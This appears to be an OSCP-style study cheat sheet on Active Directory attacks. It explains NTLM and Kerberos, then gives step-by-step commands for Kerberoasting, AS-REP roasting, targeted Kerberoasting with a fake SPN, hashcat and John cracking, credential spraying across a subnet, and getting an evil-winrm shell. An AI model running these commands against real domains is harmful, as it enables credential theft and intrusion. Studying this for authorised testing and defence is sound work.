# Active Directory
## NTLM + Kerberos + Kerberoasting + AS-REP Roasting

> **Legend:**
> `[KALI]` = Run on attack machine (Kali Linux)
> `[WINDOWS]` = Run on victim/foothold Windows machine

---

## NTLM — Quick Concept

```
CLIENT                    SERVER                      DC
  |                          |                         |
  |─── "Need Access" ───────→|                         |
  |←── Challenge (random) ───|                         |
  |    e.g. "839fba21"       |                         |
  | [NT_hash + Challenge      |                         |
  |  = Response calculated]  |                         |
  |─── Response ────────────→|                         |
  |                          |──── Verify ────────────→|
  |                          |←─── Valid/Invalid ──────|
  |←── Access Granted ───────|                         |
```

> Password never travels on network — only NT hash derived response.

---

## NTLM Hash Format

```
aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
|←────────── LM ───────────────→|:←──────── NT ─────────────────→|
```

> `aad3b435b51404eeaad3b435b51404ee` = blank LM hash (always same when LM disabled)
> Only NT part (after colon) matters for attacks

### Hash Types

| Type | Algorithm | Hashcat Mode | Notes |
|------|-----------|--------------|-------|
| LM | DES 7+7 split | 3000 | Dead — rarely seen |
| NT | MD4 | 1000 | Most common |
| NTLMv1 | MD4 + challenge | 5500 | Older systems |
| NTLMv2 | HMAC-MD5 | 5600 | Current standard |

---

## NTLM Hash Locations

| Location | Contains | Tool |
|----------|----------|------|
| SAM database | Local user hashes | secretsdump, mimikatz |
| LSASS memory | Logged-in hashes + tickets | mimikatz, pypykatz |
| NTDS.dit | ALL domain hashes | secretsdump DCSync |

### secretsdump Output Format
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
username      :RID:LM_hash                          :NT_hash                          :::
```

---

## Kerberos — Concept

```
Cinema Analogy:
You ──→ Ticket Counter (KDC) ──→ Entry Pass (TGT)
TGT ──→ Show Counter (KDC)   ──→ Show Ticket (TGS)
TGS ──→ Gate (Service)       ──→ Seat (Access)
```

### Components

| Component | Role | Attack Relevance |
|-----------|------|-----------------|
| KDC | Issues all tickets (on DC) | Central point |
| TGT | Master pass for all services | krbtgt hash encrypts it |
| TGS | Service-specific ticket | Service account hash encrypts it |
| krbtgt | Signs all TGTs | Compromise = Golden Ticket |
| SPN | Service identifier | Links service to account |

---

## Kerberos Full Flow — Encryption Map

```
Step 1 — AS-REQ:
  User ──→ KDC
  [Username + Timestamp encrypted with USER's NT hash]

Step 2 — AS-REP:                      ← AS-REP ROASTING HERE
  KDC ──→ User
  [TGT encrypted with KRBTGT hash]
  [+ session data encrypted with USER hash ← THIS IS CRACKED]

Step 3 — TGS-REQ:
  User ──→ KDC
  [TGT + SPN requested]

Step 4 — TGS-REP:                     ← KERBEROASTING HERE
  KDC ──→ User
  [Service Ticket encrypted with SERVICE ACCOUNT's NT hash]
  ↑ ANY domain user can request this for ANY SPN

Step 5 — AP-REQ:
  User ──→ Service
  [Service Ticket]

Step 6 — Access Granted ✅
```

### SPN Format
```
ServiceType/Hostname:Port
MSSQLSvc/sql01.corp.local:1433
HTTP/web01.corp.local:80
MSSQLSvc/sql01.corp.local        ← port optional
```

---

## STEP 1 — Find Kerberoastable Accounts

### Linux — GetUserSPNs.py
`[KALI]`
```bash
# List only — no hashes
impacket-GetUserSPNs corp.local/username:password -dc-ip DC_IP

# Request hashes — THIS IS WHAT YOU WANT
impacket-GetUserSPNs corp.local/username:password \
  -dc-ip DC_IP \
  -request \
  -outputfile kerberoast_hashes.txt

# With NT hash instead of password
impacket-GetUserSPNs corp.local/username \
  -hashes :NThashhere \
  -dc-ip DC_IP \
  -request \
  -outputfile kerberoast_hashes.txt
```

### GetUserSPNs Output
```
ServicePrincipalName            Name      PasswordLastSet    LastLogon
MSSQLSvc/sql01.corp.local:1433  svc_sql   2023-01-15         2024-01-10
HTTP/web01.corp.local           svc_iis   2022-06-20         Never

$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$a3f8c2d1...HASH...
$krb5tgs$23$*svc_iis$CORP.LOCAL$HTTP/web01.corp.local*$b9e2d1f4...HASH...
```

> Old PasswordLastSet + service account = likely weak password = easy crack

### Windows — Rubeus
`[WINDOWS]`
```powershell
# All Kerberoastable accounts
Rubeus.exe kerberoast /format:hashcat /outfile:kerb_hashes.txt

# Specific user
Rubeus.exe kerberoast /user:svc_sql /format:hashcat /outfile:kerb_hashes.txt

# Force RC4 (faster to crack than AES)
Rubeus.exe kerberoast /format:hashcat /rc4opsec /outfile:kerb_hashes.txt

# Stats only — how many targets
Rubeus.exe kerberoast /stats
```

### PowerView — SPN List
`[WINDOWS]`
```powershell
# All SPN users
Get-NetUser -SPN | select samaccountname, serviceprincipalname, passwordlastset

# Enabled accounts only
Get-NetUser -SPN | Where-Object {
  $_.useraccountcontrol -notmatch "ACCOUNTDISABLE"
} | select samaccountname, serviceprincipalname
```

### LDAP — Manual Search
`[KALI]`
```bash
ldapsearch -x -H ldap://DC_IP \
  -D "corp\username" -w "password" \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

---

## STEP 2 — Identify Hash Type

```
$krb5tgs$23$...  →  RC4  →  Mode 13100  →  FAST crack   ← WANT THIS
$krb5tgs$18$...  →  AES256  →  Mode 19700  →  SLOW crack
$krb5tgs$17$...  →  AES128  →  Mode 19600  →  SLOW crack
```

### Force RC4 Downgrade (if DC allows)
`[WINDOWS]`
```powershell
Rubeus.exe kerberoast /format:hashcat /rc4opsec /outfile:rc4_hashes.txt
```

---

## STEP 3 — Crack Kerberoast Hash

### Hashcat — RC4 Mode 13100
`[KALI]`
```bash
# Basic
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules — more powerful
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Multiple rules
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/toggles1.rule

# Show cracked
hashcat -m 13100 kerberoast_hashes.txt --show
```

### Hashcat — AES256 Mode 19700
`[KALI]`
```bash
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

hashcat -m 19700 kerberoast_hashes.txt --show
```

### John the Ripper
`[KALI]`
```bash
john kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john kerberoast_hashes.txt --show
```

### Not Cracking — Escalate Options
`[KALI]`
```bash
# Bigger wordlist
hashcat -m 13100 kerberoast_hashes.txt \
  /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

# CeWL — target website se custom wordlist
cewl http://corp.local -w /tmp/custom.txt
hashcat -m 13100 kerberoast_hashes.txt /tmp/custom.txt

# Brute force short passwords
hashcat -m 13100 kerberoast_hashes.txt -a 3 ?u?l?l?l?l?d?d?d

# Combination attack
hashcat -m 13100 kerberoast_hashes.txt -a 1 \
  /usr/share/wordlists/rockyou.txt \
  /usr/share/seclists/Passwords/seasons.txt
```

### Wordlist Locations
```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/hashcat/rules/best64.rule
/usr/share/hashcat/rules/toggles1.rule
/usr/share/hashcat/rules/rockyou-30000.rule
```

---

## STEP 4 — Targeted Kerberoasting (Advanced)

**When:** BloodHound shows `GenericWrite` or `GenericAll` on a user with no SPN

```
BloodHound edge:
your_user ──GenericWrite──→ target_user (no SPN)
                    ↓
           Set fake SPN → Kerberoast → Crack → Remove SPN
```

`[WINDOWS]`
```powershell
# Step 1 — Check current SPN (should be empty)
Get-DomainUser target_user | select serviceprincipalname

# Step 2 — Set fake SPN
Set-DomainObject -Identity target_user \
  -SET @{serviceprincipalname='fake/NOTHING.corp.local'}

# Step 3 — Verify
Get-DomainUser target_user | select serviceprincipalname

# Step 4 — Kerberoast
Rubeus.exe kerberoast /user:target_user /format:hashcat /outfile:targeted.txt
```

`[KALI]`
```bash
# Step 5 — Crack
hashcat -m 13100 targeted.txt /usr/share/wordlists/rockyou.txt
```

`[WINDOWS]`
```powershell
# Step 6 — Clean up
Set-DomainObject -Identity target_user -Clear serviceprincipalname
```

---

## STEP 5 — AS-REP Roasting

### Find Vulnerable Users First

`[WINDOWS]`
```powershell
# PowerView
Get-NetUser -PreauthNotRequired | select samaccountname
```

`[KALI]`
```bash
# LDAP query
ldapsearch -x -H ldap://DC_IP \
  -D "corp\username" -w "password" \
  -b "DC=corp,DC=local" \
  "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" \
  sAMAccountName
```

### GetNPUsers.py — Scenario A: No Creds
`[KALI]`
```bash
impacket-GetNPUsers corp.local/ \
  -usersfile userlist.txt \
  -dc-ip DC_IP \
  -no-pass \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

### GetNPUsers.py — Scenario B: Have Creds
`[KALI]`
```bash
impacket-GetNPUsers corp.local/username:password \
  -dc-ip DC_IP \
  -request \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

### GetNPUsers.py — Scenario C: Have NT Hash
`[KALI]`
```bash
impacket-GetNPUsers corp.local/username \
  -hashes :NThashhere \
  -dc-ip DC_IP \
  -request \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

### Windows — Rubeus
`[WINDOWS]`
```powershell
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
Rubeus.exe asreproast /user:svc_backup /format:hashcat
```

---

## STEP 6 — Crack AS-REP Hash

### Hash Format
```
$krb5asrep$23$username@DOMAIN.LOCAL:hash...
```

### Hashcat — Mode 18200
`[KALI]`
```bash
# Basic
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Show cracked
hashcat -m 18200 asrep_hashes.txt --show
```

### John the Ripper
`[KALI]`
```bash
john asrep_hashes.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=krb5asrep

john asrep_hashes.txt --show
```

---

## STEP 7 — Validate Cracked Credentials

`[KALI]`
```bash
# SMB validate single host
nxc smb DC_IP -u svc_sql -p 'SQLpass2024!' -d corp.local

# Check ALL hosts in subnet
nxc smb 192.168.1.0/24 -u svc_sql -p 'SQLpass2024!' -d corp.local

# WinRM check
nxc winrm DC_IP -u svc_sql -p 'SQLpass2024!'

# RDP check
nxc rdp DC_IP -u svc_sql -p 'SQLpass2024!'

# Get shell
evil-winrm -i VICTIM_IP -u svc_sql -p 'SQLpass2024!'
```

### Output Meanings
| Output | Meaning |
|--------|---------|
| `[+] corp\user:pass` | Valid creds |
| `(Pwn3d!)` | Local admin — can dump secrets |
| `STATUS_LOGON_FAILURE` | Wrong password |
| `STATUS_ACCOUNT_LOCKED_OUT` | STOP — locked |
| `STATUS_ACCOUNT_DISABLED` | Account disabled |

---

## STEP 8 — BloodHound Post-Exploitation

```
1. Search new account in BloodHound
2. Right click → Mark as Owned
3. Analysis → Shortest Path from Owned Principals
4. Look for edges:
   AdminTo        → local admin access
   MemberOf       → privileged group
   GenericAll     → full control
   GenericWrite   → targeted Kerberoasting
   HasSession     → DA logged in there
   DCSync         → dump all hashes
```

---

## Kerberoasting Errors + Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| `KDC_ERR_ETYPE_NOSUPP` | RC4 disabled | Use mode 19700 |
| `Clock skew too great` | Time not synced | `sudo ntpdate DC_IP` |
| `No entries found` | No SPN accounts | Try AS-REP roasting |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN wrong | Verify with GetUserSPNs |
| `KRB_AP_ERR_SKEW` | Time diff > 5 min | `sudo ntpdate -u DC_IP` |

```bash
# Time sync fix
sudo ntpdate DC_IP
# OR
sudo timedatectl set-ntp false && sudo ntpdate -u DC_IP
```

---

## AS-REP vs Kerberoast — Full Comparison

| | AS-REP Roasting | Kerberoasting |
|---|---|---|
| **Creds needed** | ❌ None | ✅ Valid domain user |
| **Target** | Pre-auth disabled users | SPN service accounts |
| **How common** | Rare | More common |
| **Hash prefix** | `$krb5asrep$23$` | `$krb5tgs$23$` |
| **Hashcat mode** | **18200** | **13100** RC4 / **19700** AES |
| **John format** | `krb5asrep` | `krb5tgs` |
| **Crack speed** | Medium | Fast RC4 / Slow AES |
| **Best used** | No-creds phase | Post initial access |
| **LDAP flag** | `DONT_REQUIRE_PREAUTH` | `servicePrincipalName` |

---

## Hash Mode — Never Confuse Again

| Attack | Hash Starts With | Hashcat Mode | John Format |
|--------|-----------------|--------------|-------------|
| AS-REP Roast | `$krb5asrep$23$` | **18200** | `krb5asrep` |
| Kerberoast RC4 | `$krb5tgs$23$` | **13100** | `krb5tgs` |
| Kerberoast AES256 | `$krb5tgs$18$` | **19700** | — |
| NT Hash | 32 char hex | **1000** | `NT` |
| NTLMv2 | `user::domain:` | **5600** | `netntlmv2` |

---

## Complete Attack Flow — Part 2A

```
Valid creds from Part 1B
        ↓
GetUserSPNs.py → SPN accounts found?
        ├── YES → kerberoast_hashes.txt
        │           ↓
        │       RC4 ($23$) → hashcat -m 13100
        │       AES ($18$) → hashcat -m 19700
        │           ↓
        │       cracked? → nxc smb validate → BloodHound Owned
        │
        └── NO → note it, continue
        ↓
GetNPUsers.py → DONT_REQUIRE_PREAUTH users?
        ├── YES → asrep_hashes.txt
        │           ↓
        │       hashcat -m 18200
        │           ↓
        │       cracked? → nxc smb validate → BloodHound Owned
        │
        └── NO → note it, continue
        ↓
BloodHound → Shortest Path from Owned Principals
        ↓
Next attack based on edges found
```

---

## Tools Install Check

`[KALI]`
```bash
# Check
which impacket-GetUserSPNs impacket-GetNPUsers hashcat john nxc evil-winrm

# Install impacket
pip install impacket
sudo apt install python3-impacket

# Install netexec
pip install netexec

# Install evil-winrm
sudo gem install evil-winrm

# SecLists
sudo apt install seclists
```

---

## OSCP Exam Tips

```
1. Always try Kerberoasting first when you have ANY valid creds
2. Always try AS-REP Roasting against full userlist even without creds
3. Old PasswordLastSet on service account = likely weak password
4. RC4 hash = prioritize — cracks 10x faster than AES
5. After every new cred → nxc smb /24 → find all Pwn3d! hosts
6. After every new cred → BloodHound Mark as Owned → check new paths
7. Service accounts (svc_*) = rarely rotated passwords = in common wordlists
8. Never spray more than (lockout_threshold - 1) per account
```

---

*Part 2A — NTLM + Kerberos + Kerberoasting + AS-REP Roasting*
*Next → Part 2B: Pass-the-Hash + Pass-the-Ticket + Lateral Movement*
